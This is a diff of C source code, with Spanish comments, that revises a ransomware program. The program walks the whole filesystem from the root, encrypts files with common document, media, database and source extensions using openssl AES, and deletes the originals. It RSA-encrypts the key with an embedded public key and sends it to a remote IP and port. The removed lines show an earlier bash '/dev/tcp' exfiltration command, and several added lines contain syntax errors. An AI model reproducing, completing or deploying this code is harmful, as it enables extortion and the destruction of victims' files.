@@ -6,16 +6,34 @@
 #include <time.h>
 #include <fcntl.h>
 #include <unistd.h>
+#include <errno.h>
+#include <sys/wait.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
 
 
 char path[100000]="/";
-char extension[][10] = {".jpg",".jpeg",".raw",".tif",".gif",".png",".bmp",".3dm",".max",".accdb",".db",".dbf",".mdb",".pdb",".sql",".dwg",".dxf",".c",".cpp",".cs",".h",".php",".asp",".rb",".java",".jar",".class",".py",".js",".aaf",".aep",".aepx",".plb",".prel",".prproj",".aet",".ppj",".psd",".indd",".indl",".indt",".indb",".inx",".idml",".pmd",".xqx",".xqx",".ai",".eps",".ps",".svg",".swf",".fla",".as3",".as",".txt",".doc",".dot",".docx",".docm",".dotx",".dotm",".docb",".rtf",".wpd",".wps",".msg",".pdf",".xls",".xlt",".xlm",".xlsx",".xlsm",".xltx",".xltm",".xlsb",".xla",".xlam",".xll",".xlw",".ppt",".pot",".pps",".pptx",".pptm",".potx",".potm",".ppam",".ppsx",".ppsm",".sldx",".sldm",".wav",".mp3",".aif",".iff",".m3u",".m4u",".mid",".mpa",".wma",".ra",".avi",".mov",".mp4",".3gp",".mpeg",".3g2",".asf",".asx",".flv",".mpg",".wmv",".vob",".m3u8",".mkv",".dat",".csv",".efx",".sdf",".vcf",".xml",".ses",".rar",".zip",".7zip"}; //agregar como lista de extensiones
+char extension[][10] = {
+    ".jpg",".jpeg",".raw",".tif",".gif",".png",".bmp",".3dm",
+    ".max",".accdb",".db",".dbf",".mdb",".pdb",".sql",".dwg",
+    ".dxf",".c",".cpp",".cs",".h",".php",".asp",".rb",".java",
+    ".jar",".class",".py",".js",".aaf",".aep",".aepx",".plb",
+    ".prel",".prproj",".aet",".ppj",".psd",".indd",".indl",
+    ".indt",".indb",".inx",".idml",".pmd",".xqx",".xqx",".ai",
+    ".eps",".ps",".svg",".swf",".fla",".as3",".as",".txt",".doc",
+    ".dot",".docx",".docm",".dotx",".dotm",".docb",".rtf",".wpd",
+    ".wps",".msg",".pdf",".xls",".xlt",".xlm",".xlsx",".xlsm",
+    ".xltx",".xltm",".xlsb",".xla",".xlam",".xll",".xlw",".ppt",
+    ".pot",".pps",".pptx",".pptm",".potx",".potm",".ppam",".ppsx",
+    ".ppsm",".sldx",".sldm",".wav",".mp3",".aif",".iff",".m3u",
+    ".m4u",".mid",".mpa",".wma",".ra",".avi",".mov",".mp4",".3gp",
+    ".mpeg",".3g2",".asf",".asx",".flv",".mpg",".wmv",".vob",".m3u8",
+    ".mkv",".dat",".csv",".efx",".sdf",".vcf",".xml",".ses",".rar",
+    ".zip",".7zip"
+}; //agregar como lista de extensiones
 int ext_len = sizeof(extension)/(sizeof(char)*10);
-/*
-".jpg",".jpeg",".raw",".tif",".gif",".png",".bmp",".3dm",".max",".accdb",".db",".dbf",".mdb",".pdb",".sql",".dwg",".dxf",".c",".cpp",".cs",".h",".php",".asp",".rb",".java",".jar",".class",".py",".js",".aaf",".aep",".aepx",".plb",".prel",".prproj",".aet",".ppj",".psd",".indd",".indl",".indt",".indb",".inx",".idml",".pmd",".xqx",".xqx",".ai",".eps",".ps",".svg",".swf",".fla",".as3",".as",".txt",".doc",".dot",".docx",".docm",".dotx",".dotm",".docb",".rtf",".wpd",".wps",".msg",".pdf",".xls",".xlt",".xlm",".xlsx",".xlsm",".xltx",".xltm",".xlsb",".xla",".xlam",".xll",".xlw",".ppt",".pot",".pps",".pptx",".pptm",".potx",".potm",".ppam",".ppsx",".ppsm",".sldx",".sldm",".wav",".mp3",".aif",".iff",".m3u",".m4u",".mid",".mpa",".wma",".ra",".avi",".mov",".mp4",".3gp",".mpeg","."3g2",".asf",".asx",".flv",".mpg",".wmv",".vob",".m3u8",".mkv",".dat",".csv",".efx",".sdf",".vcf",".xml",".ses",".rar",".zip",".7zip"
-*/
 
-//--------------------------------------------
+
 char * gen_aes(){
     static char aes[48];
     srand(time(NULL)); //Tener cuidado que con la semilla pueden calcular la key
@@ -30,35 +48,155 @@ char * gen_aes(){
 void end_file(char aes[]){
     //echo "texto ctm" | openssl rsautl -encrypt -pubin -inkey clave.pub.pem -out enviame.enc
     char command[100000]="echo -n '";
-    strcat(command,aes);
-    strcat(command,"' | openssl rsautl -encrypt -pubin -inkey clave.pub.pem -out enviame.enc");
-    //printf("%s\n",command);
-    system(command);
+    char * mybin = "/usr/bin/openssl";
+    int mypipe[2];
+    int r = pipe(mypipe);
+
+    if (r < 0) {
+        perror("Error on creating pipe.\n");
+        exit(6);
+    }
+
+    pid_t fc = fork();
+
+    if (fc < 0) {
+        perror("Error on forking.\n");
+        exit(7);
+    } else if (fc == 0) {
+        close(mypipe[1]);
+        dup2(mypipe[0], STDIN_FILENO);
+        char * args[] = {
+            "openssl", "rsautl", "-encrypt", 
+            "-pubin", "-inkey", "clave.pub.pem", 
+            "-out", "enviame.enc", (char *)NULL
+        };
+        int e = execv("/usr/bin/openssl", args);
+        exit(0)
+    } else {
+        int status;
+        close(mypipe[0]);
+        dprintf(mypipe[1], "%s", aes);
+        int ro = wait(&status);
+    }
+
+    printf("enviame.enc should have been created.\n");
+
 }
 
-void send_file(char ip[], char port[]){
-    //exec execv (vamos sin bashito)
-    char command[100000] = "bash -c 'base64 enviame.enc > /dev/tcp/";
-    strcat(command,ip);
-    strcat(command,"/");
-    strcat(command,port);
-    strcat(command,"'");
-    //printf("%s",command);
-    system(command);
+void send_file(char * filename, char * ip, char * port){
+    char * outbuffer = malloc(1024 * sizeof(char));
+    int mypipe[2]; // tubería 1 -> 0
+    int p = pipe(mypipe);
+
+    if (p == -1) {
+        perror("Error creating the pipe.\n");
+        exit(3);
+    }
+
+    pid_t fc = fork();
+
+    if (fc < 0) {
+        perror("Error on forking...\n");
+        exit(4);
+    } else if (fc == 0) { // in the child
+        dup2(mypipe[1], STDOUT_FILENO);
+        char * myargs[] = {"base64", filename, (char *) NULL};
+        int e = execv("/usr/bin/base64", myargs);
+        exit(0);
+    } else {
+        int status;
+        int r = wait(&status);
+
+        if (r == -1) {
+            perror("Something went wrong.\n");
+        }
+
+        read(mypipe[0], outbuffer, 1024);
+        //printf("result: %s\n", outbuffer);
+
+        /*
+        * next code is to handle connection
+        */
+
+        int socketfd = socket(AF_INET, SOCK_STREAM, 0);
+        
+        if (socketfd < 0) {
+            perror("Error on socket.\n");
+            exit(5);
+        }
+
+        struct sockaddr_in server_addr;
+        server_addr.sin_family = AF_INET;
+        server_addr.sin_port = htons(atoi(port));
+        r = inet_pton(AF_INET, ip, &server_addr.sin_addr);
+
+        if (r < 0) {
+            perror("Invalid address.");
+            exit(5);
+        }
+
+        r = connect(socketfd, (struct sockaddr *) &server_addr, sizeof(server_addr));
+
+        if (r < 0) {
+            perror("Connection failed");
+            exit(5);
+        }
+
+        send(socketfd, outbuffer, strlen(outbuffer), 0);
+        printf("Key was sent.\n");
+        shutdown(socketfd, SHUT_RDWR);
+        close(socketfd);
+    }
+
+    
 }
 
 void key_pub(int i){
+    char * pub_key {
+        "-----BEGIN PUBLIC KEY-----"
+        "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2iM7qHGt9FQL1HeYldsE"
+        "nwfmAhlc3bfmRaxVA07YrjdCVTXyhjKq5cn8iE8nDWUDwbrZKnLIe63G7LpT6L8l"
+        "oqCgHieEPR3ZqXzuLjr0ZCkU9cFE8E1oJV7bfLEotH5iZpeuY06C1GwWi9+Kdrf9"
+        "R0J3dplb1BIxrsAxdiq+nUHVAeUIpDefvadJsK9pjUpfvsUH7O214S8CAzH1irxY"
+        "ejQlqrGdWXlzbeTzlm+BRl9VoxL04lioKDjw5c0dpYrP/MFysZqyzZdp3ctLwRYN"
+        "818+heHgGYoakWTUOqlhQXZh+O6mecya5j6BaxcXSL7IacQc5+Q9GKzlm7FlNpga"
+        "PQHKbaSbEifpCI6Ix4p/l44ZJTpq9VkrUrZNDbSsUFCIaVaFkXtGzrFcZLVusLaq"
+        "+Y9TUF1uKzK4UxAC+hU92O+ZxVhGTg1Z99Bj4vbKvDCr1YHRJeiziwwehb4i0xia"
+        "K8ft35krQl+Slkt57MuWrefdbtD0qvvw0u6H+6thtGZv2c4vg+MSK2pddPWC8IPi"
+        "kSHJOxR9B3Tmw9cOBhMvKoUSHHl4Rfznw7t4hzk2FL/HTpee4vP626CVLqDycYBe"
+        "yMo9tDSCJzE13yydTPNS5SzmavNTlAoM6VKJ8W7eqXloJ7TGTtJejzSJDGA21dGx"
+        "8CPFuYvv302VnB7d/urDbH8CAwEAAQ=="
+        "-----END PUBLIC KEY----"
+    }
     if(i == 1){
-        //Creamos la llave publica //nativo por si el pc no tiene el comando base64
-        system("echo 'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQ0lqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FnOEFNSUlDQ2dLQ0FnRUEyaU03cUhHdDlGUUwxSGVZbGRzRQpud2ZtQWhsYzNiZm1SYXhWQTA3WXJqZENWVFh5aGpLcTVjbjhpRThuRFdVRHdiclpLbkxJZTYzRzdMcFQ2TDhsCm9xQ2dIaWVFUFIzWnFYenVManIwWkNrVTljRkU4RTFvSlY3YmZMRW90SDVpWnBldVkwNkMxR3dXaTkrS2RyZjkKUjBKM2RwbGIxQkl4cnNBeGRpcStuVUhWQWVVSXBEZWZ2YWRKc0s5cGpVcGZ2c1VIN08yMTRTOENBekgxaXJ4WQplalFscXJHZFdYbHpiZVR6bG0rQlJsOVZveEwwNGxpb0tEanc1YzBkcFlyUC9NRnlzWnF5elpkcDNjdEx3UllOCjgxOCtoZUhnR1lvYWtXVFVPcWxoUVhaaCtPNm1lY3lhNWo2QmF4Y1hTTDdJYWNRYzUrUTlHS3psbTdGbE5wZ2EKUFFIS2JhU2JFaWZwQ0k2SXg0cC9sNDRaSlRwcTlWa3JVclpORGJTc1VGQ0lhVmFGa1h0R3pyRmNaTFZ1c0xhcQorWTlUVUYxdUt6SzRVeEFDK2hVOTJPK1p4VmhHVGcxWjk5Qmo0dmJLdkRDcjFZSFJKZWl6aXd3ZWhiNGkweGlhCks4ZnQzNWtyUWwrU2xrdDU3TXVXcmVmZGJ0RDBxdnZ3MHU2SCs2dGh0R1p2MmM0dmcrTVNLMnBkZFBXQzhJUGkKa1NISk94UjlCM1RtdzljT0JoTXZLb1VTSEhsNFJmem53N3Q0aHprMkZML0hUcGVlNHZQNjI2Q1ZMcUR5Y1lCZQp5TW85dERTQ0p6RTEzeXlkVFBOUzVTem1hdk5UbEFvTTZWS0o4VzdlcVhsb0o3VEdUdEplanpTSkRHQTIxZEd4CjhDUEZ1WXZ2MzAyVm5CN2QvdXJEYkg4Q0F3RUFBUT09Ci0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=' | base64 -d > clave.pub.pem");
-    }else if(i == 0){
-        //Eliminamos la llave publica
-        system("rm clave.pub.pem");
+        int fd = open("clave.pub.pem", O_CREAT| O_WRONLY, 0444);
+        write(fd, pub_key, strlen(pub_key));
+        close(fd);
+    } else if(i == 0){
+        execv("/bin/rm", "rm", "clave.pub.pem", (char *)NULL);
     }
 }
 //--------------------------------------------
 
-void cifrar(char path[], char file[], char passwd[]){
+void cifrar(char path[], char file[], char passwd[]) {
+    /* todo: considerar usar pthreads.
+    int fc = fork();
+
+    if (fc < 0) {
+        perror("Error on forking")
+    } else (fc == 0) {
+        char mypass[100] = "pass:";
+        strcat(mypass, passwd);
+        char * myargs[] {
+        "openssl", "enc", "-aes-256-cbc", "-pass", mypass, 
+        "-in", "plain.txt", "-out", "plain.txt.ntd", (char *) NULL
+        };
+        
+        int e = execv("/usr/bin/openssl", myargs);
+    } else {
+
+    }
+    */
   char command[100000]="(openssl enc -aes-256-cbc -pass pass:";
   strcat(command,passwd);
   strcat(command," -in ");
@@ -73,7 +211,8 @@ void cifrar(char path[], char file[], char passwd[]){
   strcat(command,path);
   strcat(command,"/");
   strcat(command,file);
-  strcat(command," 2>/dev/null)&");  
+  strcat(command," 2>/dev/null)&");
+
 
   //(openssl enc -aes-256-cbc -pass pass:1234 -in plain.txt -out plain.txt.ntd 2>/dev/null; rm plain.txt 2>/dev/null)&
   system(command);
@@ -104,13 +243,13 @@ int list_files(int n, int h, char key[])
             if(strcmp(dir->d_name, ".") && strcmp(dir->d_name, "..")){
                 if(dir->d_type == DT_DIR){
                     strcat(path,"/");
-                    strcat(path,dir->d_name);
-                    list_files(strlen(path),h+1,key);
+                    strcat(path, dir->d_name);
+                    list_files(strlen(path), h+1, key);
                     path[n] = 0;
                 }else if(dir->d_type == DT_REG){
                     if(find_ext(dir->d_name)){
                         //printf("%s/%s -> Filesito\n", path,dir->d_name);
-                        cifrar(path,dir->d_name,key);
+                        cifrar(path, dir->d_name, key);
                     }
                 }
             }
